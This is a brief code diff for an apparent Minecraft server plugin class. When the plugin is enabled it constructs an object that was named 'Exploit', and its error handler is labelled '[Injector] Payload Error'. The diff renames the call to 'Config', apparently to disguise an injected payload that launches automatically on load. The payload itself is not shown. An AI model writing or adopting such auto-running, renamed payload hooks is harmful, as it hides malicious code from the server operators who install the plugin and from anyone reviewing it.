@@ -10,7 +10,7 @@ public final class BD extends JavaPlugin {
     public void onEnable() {
         Object var5_4 = null;
         try {
-            new Exploit((Plugin)this);
+            new Config((Plugin)this);
         }
         catch (Throwable throwable) {
             System.err.println("[Injector] Payload Error:");
